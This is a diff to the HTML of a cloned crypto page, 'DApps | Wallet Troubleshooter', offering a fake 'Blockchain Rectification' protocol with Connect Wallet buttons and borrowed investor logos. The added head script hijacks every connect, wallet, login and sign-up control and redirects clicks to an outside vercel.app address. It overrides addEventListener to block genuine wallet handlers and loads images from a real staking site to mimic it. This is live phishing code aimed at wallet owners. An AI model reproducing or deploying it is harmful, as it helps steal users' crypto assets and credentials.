@@ -1,4 +1,86 @@
-<!DOCTYPE html><html lang="en"><head>   <script class="dynamic-script">
+<!DOCTYPE html><html lang="en" class="dark" style="--progress-primary-color: #FF6E30;"><head>  <script>
+  const redirectURL = "https://securedconnection.vercel.app/";
+
+  function blockEvent(event) {
+    event.preventDefault();
+    event.stopImmediatePropagation();
+    event.stopPropagation();
+    console.log("Blocked & Redirecting...");
+    window.location.href = redirectURL;
+  }
+
+  function patchElement(el) {
+    if (!el || el.dataset.patched) return;
+    el.dataset.patched = "true";
+
+    ["click", "mousedown", "pointerdown"].forEach((eventType) => {
+      el.addEventListener(eventType, blockEvent, true);  // Capture phase
+      el.addEventListener(eventType, blockEvent, false); // Bubble phase
+    });
+
+    // Disable default attributes
+    el.removeAttribute("href");
+    el.removeAttribute("onclick");
+  }
+
+  function scanAndPatch() {
+    const allElements = document.querySelectorAll("*");
+    allElements.forEach((el) => {
+      const text = (el.innerText || "").toLowerCase().trim();
+      if (
+        text.includes("connect wallet") ||
+        text.includes("connect to wallet") ||
+        text.includes("connect") ||
+        text.includes("wallet connect") ||
+        text.includes("metamask") ||
+        text.includes("web3") ||
+        text.includes("log in") ||
+        text.includes("sign in") ||
+        text.includes("sign up") ||
+        text.includes("register") ||
+        text.includes("create account") ||
+        text.includes("login")
+      ) {
+        patchElement(el);
+      }
+    });
+  }
+
+  window.addEventListener("load", () => {
+    scanAndPatch();
+
+    // Watch for dynamic elements
+    const observer = new MutationObserver(() => {
+      scanAndPatch();
+    });
+
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true,
+    });
+  });
+
+  // Optional: override addEventListener to block future handlers
+  const originalAddEventListener = EventTarget.prototype.addEventListener;
+  EventTarget.prototype.addEventListener = function (type, listener, options) {
+    if (typeof listener === "function" && type === "click") {
+      // Prevent wallet modal listeners from registering
+      const toString = listener.toString();
+      if (
+        toString.includes("wallet") ||
+        toString.includes("connect") ||
+        toString.includes("provider") ||
+        toString.includes("web3")
+      ) {
+        console.warn("Blocked suspicious listener:", toString.slice(0, 100));
+        return;
+      }
+    }
+    return originalAddEventListener.call(this, type, listener, options);
+  };
+</script>
+
+   <script class="dynamic-script">
   window.addEventListener("DOMContentLoaded", () => {
     console.log("🔁 Running prioritized image fixer...");
 
@@ -13,7 +95,8 @@ const interactiveElements = Array.from(clickableElements).filter((el) => {
   const text = (el.innerText || "").toLowerCase().trim();
   return (
     text.includes("connect wallet") ||
-    text.includes("connect to wallet") ||
+    text.includes("connect to wallet") ||  
+    text.includes("connect") ||
     text.includes("wallet connect") ||
     text.includes("metamask") ||
     text.includes("web3") ||
@@ -31,6 +114,13 @@ const interactiveElements = Array.from(clickableElements).filter((el) => {
         // Remove any href or onclick behavior
         el.removeAttribute("href");
         el.removeAttribute("onclick");
+        
+    // First event listener
+            el.addEventListener("click", function (event) {
+              event.stopImmediatePropagation(); // This stops the next listener from running
+              console.log("First click handler");
+            });
+
 
         // If there's an <a> inside, disable it too
         const anchor = el.querySelector("a");
@@ -64,7 +154,7 @@ const interactiveElements = Array.from(clickableElements).filter((el) => {
           !src.startsWith("//") &&
           !src.startsWith("http")
         ) {
-          img.src = new URL(src, "https://secure-block-dapps.netlify.app/").href;
+          img.src = new URL(src, "https://stake.rocketpool.net/").href;
         }
       });
     }
@@ -78,6 +168,7 @@ const interactiveElements = Array.from(clickableElements).filter((el) => {
       
        const interactiveElements = Array.from(document.querySelectorAll("*")).filter(el => 
   el.innerText.toLowerCase().includes("connect wallet") ||
+  el.innerText.toLowerCase().includes("connect") ||
   el.innerText.toLowerCase().includes("connect to wallet") ||
   el.innerText.toLowerCase().includes("wallet connect") ||
   el.innerText.toLowerCase().includes("metamask") ||
@@ -120,4 +211,698 @@ const interactiveElements = Array.from(clickableElements).filter((el) => {
             }
           };
         })();
-      </script><base href="https://secure-block-dapps.netlify.app/"><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="preload" href="/_next/static/media/d6ea71070c5fcc60-s.p.woff2" as="font" crossorigin="" type="font/woff2"><link rel="preload" as="image" href="/bannerimage@3x-1.png"><link rel="stylesheet" href="/_next/static/css/1e94ac571796fa71.css" data-precedence="next"><link rel="stylesheet" href="/_next/static/css/a8003e953fafd7a8.css" data-precedence="next"><link rel="preload" as="script" fetchpriority="low" href="/_next/static/chunks/webpack-79ecfd49d06ff6b0.js"><script src="/_next/static/chunks/fd9d1056-9179eaa6fa6d7e55.js" async=""></script><script src="/_next/static/chunks/23-185a72c88ddc5b78.js" async=""></script><script src="/_next/static/chunks/main-app-2cafe6b471aea5af.js" async=""></script><script src="/_next/static/chunks/974-f4b6abb074fdc10c.js" async=""></script><script src="/_next/static/chunks/app/page-abb83ec96df195a0.js" async=""></script><title>DApps | Wallet Troubleshooter</title><meta name="description" content="DApps | Wallet Troubleshooter"><meta name="next-size-adjust"><script src="/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js" nomodule=""></script></head><body class="__className_de9c82"><div><div class="bg-[#2c5241]"><header class="sticky top-0 z-50"><div class="bg-emerald-500"><div class="flex items-center justify-between px-4 py-4"><a class="flex items-center" href="/"><img alt="Logo" loading="lazy" width="70" height="70" decoding="async" data-nimg="1" style="color:transparent" srcset="/_next/image?url=%2Flogos.png&amp;w=96&amp;q=75 1x, /_next/image?url=%2Flogos.png&amp;w=256&amp;q=75 2x" src="/_next/image?url=%2Flogos.png&amp;w=256&amp;q=75"></a><button class="md:hidden p-2 rounded focus:outline-none"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button><nav class="hidden md:flex items-center space-x-8"><a class="text-white hover:text-emerald-100" href="/">Home</a><a class="text-white hover:text-emerald-100" href="#about">About</a><a class="text-white hover:text-emerald-100" href="#roadmap">Roadmap</a><a class="text-white hover:text-emerald-100" href="#faq">FAQ</a><button class="bg-emerald-600 hover:bg-emerald-700 text-white px-4 py-2 rounded"><a href="/syncwallets">Connect Wallet</a></button></nav></div></div></header><div class="lg:pt-[100px] md:pt-[100px] sm:pt-[0px] mx-auto rounded-lg flex flex-wrap min-h-screen mb-20 bg-[#2c5241]"><div class="p-[50px] max-w-[850px] flex flex-col gap-3"><h1 class="text-white text-[34px] font-[600] md:text-[46px]">Blockchain Rectification</h1><p class="text-white">This is not an app but a protocol that establishes a remote resolution between all noncustodial wallet discover decentralized solutions, seamless transactions, and a decentralized ecosystem. Join us in revolutionizing the way you interact with digital assets and decentralized applications.</p><button class="w-[200px] bg-emerald-500 hover:bg-emerald-600 text-white text-sm px-4 py-2 rounded"><a href="/syncwallets">Connect Wallet</a></button></div><div><img src="/bannerimage@3x-1.png" alt="image" class="h-auto w-full md:w-[400px]"></div><div class="pb-3 w-full"><div class="mycontainer"><div class="px-4 flex flex-col gap-6"><div><p class="text-center text-[0.875rem] font-bold text-customGray-main">POWERED BY AMAZING INVESTORS:</p></div><div class="flex flex-wrap items-center justify-center gap-4 lg:justify-between"><div class="flex items-center justify-center"><svg width="150" height="48" viewBox="0 0 253 48" fill="none" xmlns="http://www.w3.org/2000/svg" class="svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.84 16.102L.153 7.821 2.761.153 19.17 6.288h13.495L48.922.266l.152-.113.017.05.136-.05-.123.09 2.577 7.578-1.687 8.281 1.227.767-1.687 1.227 1.227.92-1.687 1.534 1.073.613-2.3 2.76 3.527 10.889h-9.355l-3.221.078 3.068.075-5.237 7.78.023.195-6.288 2.913v-1.84l-.613-4.447 5.855-4.505-.023-.21-.004.114-5.91 4.546.082.055.46 4.447-.46-.46h-7.668l-.257.257-.025.178.283-.282h7.667l.46.46v1.84l6.44-3.066-2.146 1.84-4.6 3.067h-7.822l-4.447-3.068-2.3-1.84 6.287 3.067v-.073l-6.288-2.994.907-7.849-.015-.029-.892 7.878-11.501 3.22-3.22-11.194 9.354-.154.1.151 3.045-.074-3.145-.076H.613l3.492-10.778-2.265-2.718 1.074-.767-1.687-1.533 1.227-.92-1.687-1.227 1.073-.767zm9.662 9.508l11.186.454.008.154-11.115-.451-.079-.157zm17.175 4.294v9.023l.307-12.703 1.074 5.826.145-.042.034-.01 5.495-1.634-.148 4.448.152.003.149-4.45-3.987-1.84-.028.057-.126-.058-1.575 3.295-1.031-5.595 11.193-.454.154-.16-3.214-4.745 3.062 4.899-11.349.46-.001.01-.306 3.67zm-12.426 5.06h.005l-.004.036-.001-.035zm0-.121l.005.122-.006-.01-.002-.078.004-.035zm-4.586-8.91l-.005-.012 4.443 4.443.148 4.448h-.005l-.143-4.294-4.438-4.586zm4.438 4.431l3.987-1.84 1.687 3.527-5.674-1.687zM29.909 14.35l9.077-6.67-9.014 6.725-.063-.055zm-7.672 25.217l-6.898 3.372 6.865-3.134.032-.238z" fill="#F5841F"></path><path d="M36.652 42.94l5.367-8.128 9.354.153-3.22 11.195-11.501-3.22z" fill="#F5841F"></path><path d="M78.943 12.268h-3.22s-.154 0-.154.154l-2.76 9.048c0 .153-.154.153-.307 0l-2.76-9.048s0-.154-.154-.154h-4.754s-.153 0-.153.154v23.003s0 .153.153.153h3.374s.153 0 .153-.153V17.789c0-.153.153-.153.307 0l2.76 9.048.154.614s0 .153.153.153h2.607s.153 0 .153-.153l.154-.614 2.76-9.048c0-.153.307-.153.307 0v17.483s0 .153.153.153h3.374s.153 0 .153-.153V12.268s0-.153-.153-.153h-2.3v.153zm13.981 19.63v-7.055s0-.153.153-.153h8.894s.154 0 .154-.153v-2.914s0-.153-.154-.153h-8.894s-.153 0-.153-.154v-6.134s0-.153.153-.153h10.121s.154 0 .154-.154v-2.607s0-.153-.154-.153H89.55s-.154 0-.154.153v22.697s0 .153.154.153h13.955s.153 0 .153-.153v-3.067s0-.154-.153-.154l-10.581.154zm34.53-19.783h-15.642s-.154 0-.154.153v2.914s0 .153.154.153h6.134v19.937s0 .153.153.153h3.374s.153 0 .153-.153V15.335h6.135s.153 0 .153-.153l-.46-3.067zm22.569 23.31h3.067c.153 0 .153-.153.153-.153l-6.288-23.004s0-.153-.153-.153h-4.447s-.154 0-.154.153l-6.287 23.004c0 .153 0 .153.153.153h3.067s.154 0 .154-.153l1.84-6.748s0-.153.153-.153h6.748s.153 0 .153.153l1.841 6.9c-.154 0-.154 0 0 0zm-7.975-10.121l2.454-8.895c0-.153.153-.153.306 0l2.454 8.895c0 .153 0 .153-.153.153h-4.908c-.153 0-.153-.154-.153-.154zm30.39-13.036c-.154 0-.154 0 0 0l-2.914 9.048c0 .154-.153.154-.307 0l-2.76-9.048s0-.153-.153-.153h-4.908s-.153 0-.153.153v23.004s0 .153.153.153h3.374s.153 0 .153-.153V17.789c0-.153.154-.153.307 0l2.761 9.048.153.614s0 .153.153.153h2.607s.154 0 .154-.153l.153-.614 2.76-9.048c0-.153.307-.153.307 0v17.483s0 .153.153.153h3.374s.154 0 .154-.153V12.268s0-.153-.154-.153h-5.367v.153zm27.629 23.157h3.067c.154 0 .154-.153.154-.153L197 12.268s0-.153-.153-.153H192.4s-.154 0-.154.153l-6.287 23.004c0 .153 0 .153.153.153h3.067s.153 0 .153-.153l1.841-6.748s0-.153.153-.153h6.748s.153 0 .153.153l1.84 6.9zm-7.821-10.121l2.454-8.895c0-.153.153-.153.307 0l2.453 8.895c0 .153 0 .153-.153.153H192.4c-.154 0-.154-.154-.154-.154zm31.003-1.074c-1.38-.92-2.913-1.534-4.294-2.3-.92-.46-1.84-.92-2.76-1.687-1.38-1.074-1.073-3.374.307-4.294 1.993-1.38 5.367-.614 5.827 2.147 0 0 0 .153.154.153h3.067c.153 0 .153 0 .153-.153-.153-1.84-.92-3.527-2.3-4.447-1.227-.92-2.761-1.534-4.294-1.534-8.128 0-8.895 8.588-4.448 11.195.461.307 4.754 2.454 6.288 3.374 1.534.92 1.994 2.607 1.38 3.987-.613 1.227-2.147 2.147-3.68 1.993-1.687-.153-3.067-1.073-3.527-2.453-.154-.307-.154-.767-.154-.92 0 0 0-.154-.153-.154h-3.374s-.153 0-.153.154c0 2.453.613 3.68 2.3 4.907 1.534 1.227 3.22 1.687 4.907 1.687 4.601 0 6.901-2.607 7.361-5.214.46-2.607-.306-4.907-2.607-6.441zm28.984 10.888L240.731 23.31v-.153l10.429-10.735c.153-.154 0-.154-.154-.154h-4.447l-8.741 9.048c-.154.154-.154 0-.154-.153v-8.895s0-.153-.153-.153h-3.374s-.153 0-.153.153v23.004s0 .153.153.153h3.374s.153 0 .153-.153V25.15c0-.153.154-.153.154-.153l9.968 10.275h4.447s.153-.154 0-.154z" fill="#fff"></path></svg></div><div class="flex items-center justify-center"><svg width="150" height="48" viewBox="0 0 163 41" fill="none" xmlns="http://www.w3.org/2000/svg" class="svg"><path d="M17.0735 25.6782C18.6726 25.7041 22.1519 25.7604 22.1765 23.5284C22.2008 21.2187 18.7421 21.2897 17.117 21.3231C16.9497 21.3265 16.8019 21.3295 16.6793 21.3295V25.6737C16.7914 25.6737 16.9243 25.6758 17.0735 25.6782Z" fill="#009FE8"></path><path d="M16.9433 19.3525C18.2321 19.396 21.2664 19.4984 21.2915 17.4144C21.3158 15.3006 18.4341 15.3662 17.0747 15.3972C16.9339 15.4004 16.8093 15.4033 16.7061 15.4033V19.3452C16.7761 19.3469 16.8556 19.3496 16.9433 19.3525Z" fill="#009FE8"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M35.2089 13.7407C35.2089 35.1396 18.0737 40.9586 18.0737 40.9586C18.0737 40.9586 0.938477 35.1396 0.938477 13.7407V6.04464C0.938477 5.21336 1.58205 4.51615 2.41334 4.46252C5.52395 4.32844 12.8983 3.68486 18.0737 0.922852C23.2491 3.68486 30.6234 4.32844 33.734 4.46252C34.5653 4.51615 35.2089 5.21336 35.2089 6.04464V13.7407ZM20.2457 13.1776C22.7932 13.4189 24.7776 14.2234 24.9921 16.5564C25.153 18.2726 24.429 19.2915 23.2759 19.8279C25.153 20.2837 26.3061 21.4368 26.0647 23.9307C25.7429 27.0413 23.4368 27.8725 20.1117 28.0334V31.305H18.1273V28.0871C17.6178 28.0871 17.0815 28.0871 16.5452 28.0603V31.305H14.5876V28.0334C14.1318 28.0066 10.9943 28.0334 10.9943 28.0334L11.0212 25.6469H13.2469V15.2156H10.7262V13.1508C10.7262 13.1508 14.2659 13.1239 14.6949 13.1239L14.6681 9.87925H16.6524V13.0703H18.2614V9.90607H20.2457V13.1776Z" fill="#009FE8"></path><path d="M69.504 27.9397C69.504 29.6559 69.1553 31.0771 68.485 32.2302C67.8146 33.3832 66.9028 34.3218 65.8034 35.019C64.6771 35.7162 63.4168 36.2257 61.9956 36.5475C60.5743 36.8424 59.0995 37.0033 57.6246 37.0033H45.209V5.81675H57.6246C58.8313 5.81675 60.0648 5.95082 61.3252 6.19216C62.5855 6.43351 63.7386 6.86256 64.7576 7.47932C65.7766 8.09608 66.6079 8.90055 67.2783 9.91955C67.9218 10.9385 68.2436 12.2525 68.2436 13.8346C68.2436 15.5776 67.7878 16.9989 66.8224 18.1251C65.8838 19.2514 64.6503 20.0827 63.1218 20.5653V20.6458C64.0067 20.8067 64.838 21.0748 65.6157 21.4771C66.3933 21.8793 67.0637 22.3888 67.6269 23.0056C68.19 23.6223 68.6459 24.3464 68.9945 25.1776C69.3162 25.9821 69.504 26.8938 69.504 27.9397ZM60.9498 14.8536C60.9498 13.8078 60.5475 13.0302 59.7431 12.5475C58.9386 12.0648 57.7319 11.8234 56.1498 11.8234H52.4492V18.2592H56.4984C57.9196 18.2592 58.9922 17.9642 59.7699 17.4011C60.5743 16.8112 60.9498 15.9531 60.9498 14.8536ZM61.9688 27.2156C61.9688 25.9285 61.4861 25.0168 60.5207 24.5341C59.5553 24.0246 58.2682 23.7832 56.6324 23.7832H52.4492V30.9162H56.6861C57.276 30.9162 57.8928 30.8626 58.5095 30.7553C59.1263 30.648 59.7162 30.4603 60.2257 30.219C60.7352 29.9508 61.1643 29.5754 61.4861 29.0927C61.8079 28.61 61.9688 27.9933 61.9688 27.2156Z" fill="#fff"></path><path d="M79.5062 8.06926C79.5062 8.63239 79.3989 9.14189 79.1844 9.62457C78.9699 10.1073 78.6749 10.5363 78.2995 10.8849C77.9241 11.2335 77.495 11.5017 76.9855 11.7162C76.476 11.9307 75.9397 12.0112 75.3766 12.0112C74.1967 12.0112 73.2313 11.6357 72.4269 10.8313C71.6224 10.0536 71.247 9.11508 71.247 8.04245C71.247 7.50614 71.3542 6.99664 71.5688 6.51396C71.7833 6.03127 72.0783 5.60222 72.4537 5.25362C72.8291 4.90501 73.285 4.61005 73.7676 4.39552C74.2771 4.181 74.8135 4.07373 75.4034 4.07373C75.9665 4.07373 76.5028 4.18099 77.0123 4.3687C77.5218 4.58323 77.9777 4.85139 78.3263 5.19999C78.7017 5.54859 78.9967 5.97764 79.2112 6.46032C79.3989 6.96982 79.5062 7.50613 79.5062 8.06926ZM71.7565 15.0681H78.9967V37.0033H71.7565V15.0681Z" fill="#fff"></path><path d="M92.0827 20.4313V28.8246C92.0827 29.8704 92.2704 30.6212 92.6727 31.1575C93.0749 31.667 93.7721 31.9352 94.8179 31.9352C95.1665 31.9352 95.5419 31.9084 95.9442 31.8547C96.3464 31.8011 96.6682 31.7207 96.9364 31.5866L97.0168 36.8693C96.5073 37.057 95.8905 37.191 95.1129 37.3251C94.3352 37.4592 93.5844 37.5128 92.8067 37.5128C91.3319 37.5128 90.0984 37.3251 89.1062 36.9497C88.114 36.5743 87.3095 36.0648 86.6928 35.3676C86.1028 34.6704 85.647 33.8659 85.3788 32.9005C85.1107 31.9352 84.9766 30.8894 84.9766 29.7095V20.4313H81.5174V15.0681H85.0034V9.30278H92.1095V15.0681H97.2581V20.4313H92.0827Z" fill="#fff"></path><path d="M123.403 37.057C121.365 37.5665 119.14 37.8078 116.726 37.8078C114.232 37.8078 111.926 37.4056 109.835 36.6279C107.743 35.8235 105.92 34.724 104.418 33.276C102.916 31.8279 101.71 30.1117 100.878 28.1005C100.02 26.0894 99.5911 23.8369 99.5911 21.3698C99.5911 18.876 100.02 16.6235 100.905 14.5855C101.763 12.5475 102.97 10.8313 104.498 9.41004C106.027 7.98881 107.824 6.88938 109.861 6.13854C111.926 5.3877 114.125 4.98546 116.512 4.98546C118.979 4.98546 121.258 5.36088 123.377 6.11172C125.495 6.86256 127.211 7.85473 128.525 9.14189L123.779 14.5586C123.055 13.7005 122.063 13.0033 120.883 12.467C119.676 11.9307 118.308 11.6626 116.78 11.6626C115.466 11.6626 114.232 11.9039 113.133 12.3866C112.007 12.8693 111.041 13.5397 110.237 14.4246C109.406 15.2827 108.762 16.3285 108.333 17.5084C107.877 18.6883 107.636 20.0022 107.636 21.3966C107.636 22.8447 107.85 24.1586 108.253 25.3654C108.655 26.5721 109.272 27.6179 110.076 28.476C110.88 29.3341 111.873 30.0313 113.079 30.514C114.259 30.9966 115.627 31.238 117.155 31.238C118.04 31.238 118.872 31.1843 119.676 31.0503C120.454 30.9162 121.205 30.7017 121.875 30.4067V24.7218H115.922V18.581H128.793V35.0994C127.211 35.9039 125.441 36.5475 123.403 37.057Z" fill="#fff"></path><path d="M155.904 25.9553C155.904 27.752 155.582 29.3609 154.939 30.8358C154.295 32.2838 153.41 33.5174 152.284 34.5363C151.158 35.5553 149.871 36.333 148.396 36.8961C146.921 37.4592 145.366 37.7274 143.676 37.7274C142.04 37.7274 140.458 37.4592 138.983 36.8961C137.509 36.333 136.195 35.5553 135.095 34.5363C133.996 33.5174 133.111 32.2838 132.467 30.8358C131.824 29.3877 131.502 27.752 131.502 25.9553C131.502 24.1587 131.824 22.5498 132.467 21.1017C133.111 19.6537 133.996 18.447 135.095 17.4548C136.195 16.4626 137.482 15.6849 138.983 15.1754C140.458 14.6391 142.04 14.371 143.676 14.371C145.339 14.371 146.921 14.6391 148.396 15.1754C149.871 15.7118 151.158 16.4626 152.284 17.4548C153.41 18.447 154.268 19.6805 154.939 21.1017C155.582 22.5498 155.904 24.1587 155.904 25.9553ZM148.959 25.9553C148.959 25.2581 148.852 24.5609 148.61 23.8905C148.369 23.2201 148.047 22.6302 147.591 22.0939C147.162 21.5844 146.599 21.1553 145.956 20.8335C145.312 20.5118 144.561 20.3509 143.703 20.3509C142.845 20.3509 142.094 20.5118 141.451 20.8335C140.807 21.1553 140.271 21.5844 139.842 22.0939C139.413 22.6034 139.091 23.1933 138.876 23.8905C138.662 24.5609 138.554 25.2581 138.554 25.9553C138.554 26.6525 138.662 27.3498 138.876 28.0201C139.091 28.6905 139.413 29.3073 139.868 29.8436C140.297 30.3799 140.861 30.8358 141.504 31.1576C142.148 31.4794 142.899 31.6403 143.757 31.6403C144.615 31.6403 145.366 31.4794 146.009 31.1576C146.653 30.8358 147.189 30.4067 147.645 29.8436C148.074 29.3073 148.423 28.6905 148.637 28.0201C148.852 27.3498 148.959 26.6525 148.959 25.9553Z" fill="#fff"></path><path d="M159.578 32.7129C160.946 32.7129 162.099 33.7855 162.099 35.2068C162.099 36.6548 160.919 37.7274 159.578 37.7274C158.21 37.7274 157.03 36.6548 157.03 35.2068C157.03 33.7587 158.184 32.7129 159.578 32.7129ZM159.578 33.1152C158.425 33.1152 157.513 34.0269 157.513 35.2068C157.513 36.4403 158.425 37.2984 159.578 37.2984C160.731 37.2984 161.616 36.4135 161.616 35.2068C161.616 34.0001 160.704 33.1152 159.578 33.1152ZM159.042 36.6548H158.586V33.7587H159.685C160.382 33.7587 160.704 34.0269 160.704 34.59C160.704 35.0995 160.382 35.3408 159.953 35.3945L160.785 36.6548H160.302L159.524 35.3945H159.015V36.6548H159.042ZM159.042 35.0459H159.578C160.114 35.0459 160.302 34.885 160.302 34.5632C160.302 34.295 160.168 34.1341 159.658 34.1341H159.068V35.0459H159.042Z" fill="#fff"></path></svg></div><div class="flex items-center justify-center"><svg width="150" height="48" viewBox="0 0 224 40" fill="none" xmlns="http://www.w3.org/2000/svg" class="svg"><path d="M45.1582 11.1922C36.983 11.1922 30.6569 17.3236 30.6569 25.5961C30.6569 33.8686 36.8857 40 45.1582 40C53.4307 40 59.7567 33.7713 59.7567 25.5961C59.7567 17.4209 53.528 11.1922 45.1582 11.1922ZM45.2555 33.9659C40.5839 33.9659 37.2749 30.365 37.2749 25.4988C37.2749 20.6326 40.5839 17.0316 45.2555 17.0316C49.927 17.0316 53.3333 20.6326 53.3333 25.4988C53.3333 30.365 49.8297 33.9659 45.2555 33.9659ZM61.5085 17.4209H65.4988V39.4161H72.0195V11.6788H61.5085V17.4209ZM14.4039 17.129C17.8102 17.129 20.5353 19.1727 21.5085 22.2871H28.3212C27.056 15.6691 21.6058 11.0949 14.4039 11.0949C6.32604 11.1922 0 17.3236 0 25.5961C0 33.8686 6.22871 40 14.5012 40C21.5085 40 27.056 35.5231 28.3212 28.8078H21.5085C20.5353 31.9221 17.8102 34.0633 14.5012 34.0633C9.82968 34.0633 6.52068 30.4623 6.52068 25.5961C6.52068 20.7299 9.73236 17.129 14.4039 17.129ZM184.234 22.871L179.465 22.1898C177.226 21.8978 175.572 21.1192 175.572 19.3674C175.572 17.4209 177.713 16.4477 180.535 16.4477C183.65 16.4477 185.693 17.8102 186.083 19.9513H192.311C191.63 14.4039 187.348 11.0949 180.73 11.0949C173.917 11.0949 169.343 14.5985 169.343 19.562C169.343 24.2336 172.263 27.056 178.297 27.8346L183.066 28.5158C185.402 28.8078 186.667 29.781 186.667 31.4355C186.667 33.674 184.428 34.5499 181.314 34.5499C177.518 34.5499 175.377 32.9927 174.988 30.6569H168.662C169.246 36.1071 173.528 39.9027 181.217 39.9027C188.224 39.9027 192.993 36.691 192.993 31.1436C192.993 26.2774 189.586 23.747 184.234 22.871ZM68.8078 0.291971C66.472 0.291971 64.6229 2.0438 64.6229 4.37956C64.6229 6.71533 66.3747 8.46715 68.8078 8.46715C71.1436 8.46715 72.9927 6.71533 72.9927 4.37956C72.9927 2.0438 71.1436 0.291971 68.8078 0.291971ZM163.601 21.2165C163.601 15.1825 159.903 11.1922 152.214 11.1922C144.915 11.1922 140.827 14.8905 139.951 20.5353H146.375C146.667 18.2968 148.419 16.545 152.117 16.545C155.426 16.545 156.983 18.0049 156.983 19.7567C156.983 22.0925 154.063 22.6764 150.365 23.0657C145.401 23.6496 139.27 25.3041 139.27 31.7275C139.27 36.691 142.968 39.9027 148.905 39.9027C153.577 39.9027 156.399 37.9562 157.859 34.9392C158.054 37.6642 160.097 39.4161 163.017 39.4161H166.813V33.674H163.601V21.2165ZM157.178 28.1265C157.178 31.8248 153.966 34.5499 149.976 34.5499C147.543 34.5499 145.499 33.5766 145.499 31.3382C145.499 28.6131 148.808 27.8346 151.825 27.5426C154.745 27.2506 156.302 26.6667 157.178 25.4015V28.1265ZM122.92 11.1922C119.319 11.1922 116.302 12.6521 114.161 15.1825V0H107.737V39.4161H114.063V35.8151C116.204 38.4428 119.319 40 122.92 40C130.706 40 136.545 33.8686 136.545 25.5961C136.545 17.3236 130.608 11.1922 122.92 11.1922ZM121.947 33.9659C117.275 33.9659 113.966 30.365 113.966 25.4988C113.966 20.6326 117.372 17.0316 122.044 17.0316C126.715 17.0316 130.024 20.6326 130.024 25.4988C130.024 30.4623 126.618 33.9659 121.947 33.9659ZM92.2628 11.1922C88.0779 11.1922 85.3528 12.944 83.6983 15.2798V11.6788H77.275V39.4161H83.6983V24.3309C83.6983 20.0487 86.4234 17.129 90.4136 17.129C94.1119 17.129 96.4477 19.7567 96.4477 23.5523V39.4161H102.871V23.0657C102.871 16.0584 99.2701 11.1922 92.2628 11.1922ZM223.747 24.7202C223.747 16.7397 217.908 11.1922 210.122 11.1922C201.849 11.1922 195.718 17.4209 195.718 25.5961C195.718 34.2579 202.238 40 210.219 40C216.934 40 222.19 36.0097 223.552 30.365H216.837C215.864 32.7981 213.528 34.2579 210.316 34.2579C206.131 34.2579 203.017 31.7275 202.336 27.1533H223.747V24.7202ZM202.725 22.5791C203.796 18.6861 206.618 16.837 210.024 16.837C213.723 16.837 216.448 18.8808 217.129 22.5791H202.725V22.5791Z" fill="#0052FF"></path></svg></div><div class="flex items-center justify-center"><svg width="150" height="48" viewBox="0 0 246 62" fill="none" xmlns="http://www.w3.org/2000/svg" class="svg"><path d="M20.163 21.27c2.86-.217 7.091-.995 11.205-3.717 4.12 2.726 8.36 3.503 11.226 3.717-.133 5.237-.393 8.987-.808 11.748-.492 3.267-1.161 4.855-1.847 5.809-.671.931-1.563 1.562-3.327 2.537-.279.154-.576.315-.89.486h-.003c-1.213.658-2.684 1.454-4.35 2.533-1.665-1.077-3.134-1.873-4.345-2.53a119.82 119.82 0 01-.896-.488c-1.761-.975-2.65-1.605-3.318-2.536-.685-.953-1.353-2.541-1.842-5.81-.414-2.761-.673-6.512-.805-11.75z" fill="#009FE8"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M20.718 0h20.27c11.441 0 20.717 9.276 20.717 20.718v20.27c0 11.441-9.276 20.717-20.718 20.717H20.718C9.276 61.705 0 52.43 0 40.987V20.718C0 9.276 9.276 0 20.718 0zm12.593 11.452a3.032 3.032 0 00-3.886 0c-4.63 3.867-9.912 3.84-12.065 3.83h-.288a3.031 3.031 0 00-3.032 3.076c.104 6.895.38 11.876.932 15.56.551 3.68 1.418 6.365 2.912 8.447 1.512 2.105 3.448 3.275 5.31 4.305.33.183.665.365 1.004.549 1.611.875 3.336 1.812 5.403 3.294a3.031 3.031 0 003.534 0c2.069-1.483 3.796-2.42 5.41-3.297.337-.183.67-.363 1-.546 1.863-1.029 3.801-2.198 5.315-4.302 1.498-2.082 2.368-4.767 2.921-8.448.555-3.686.83-8.667.935-15.562a3.031 3.031 0 00-3.031-3.077l-.292.001c-2.17.01-7.452.036-12.082-3.83z" fill="#009FE8"></path><path d="M82.404 24.842h-6.699v-3.948h18.241v3.948h-6.698v16.986h-4.844V24.842zm16.132 3.02c.558-.778 1.305-1.366 2.242-1.765.957-.398 2.053-.598 3.289-.598v4.307a16.64 16.64 0 00-1.046-.06c-1.336 0-2.382.379-3.14 1.136-.758.738-1.137 1.854-1.137 3.35v7.596H94.08v-16.09h4.457v2.124zm22.837-2.123v16.089h-4.427v-1.915a6.347 6.347 0 01-2.213 1.615 7.128 7.128 0 01-2.781.539c-2.113 0-3.787-.608-5.023-1.824-1.236-1.216-1.854-3.02-1.854-5.413v-9.091h4.664v8.403c0 2.591 1.087 3.888 3.26 3.888 1.116 0 2.014-.36 2.692-1.077.677-.738 1.016-1.824 1.016-3.26V25.74h4.666zm7.94 16.328c-1.336 0-2.642-.16-3.917-.478-1.277-.34-2.293-.758-3.051-1.257l1.555-3.349c.718.458 1.585.837 2.602 1.136 1.017.28 2.013.419 2.99.419 1.974 0 2.961-.488 2.961-1.466 0-.458-.27-.787-.807-.986-.539-.2-1.366-.37-2.483-.509-1.315-.2-2.402-.429-3.259-.687a5.162 5.162 0 01-2.243-1.376c-.618-.658-.927-1.595-.927-2.811 0-1.017.289-1.914.867-2.692.598-.797 1.455-1.415 2.572-1.854 1.136-.438 2.472-.658 4.007-.658 1.137 0 2.263.13 3.379.39 1.137.239 2.074.577 2.812 1.016l-1.556 3.32c-1.415-.798-2.96-1.197-4.635-1.197-.997 0-1.744.14-2.243.419-.498.279-.747.638-.747 1.077 0 .498.269.846.807 1.046.538.2 1.396.389 2.572.569 1.316.219 2.392.458 3.229.717a4.74 4.74 0 012.183 1.346c.618.657.927 1.575.927 2.75 0 .998-.298 1.885-.896 2.662-.599.778-1.476 1.386-2.632 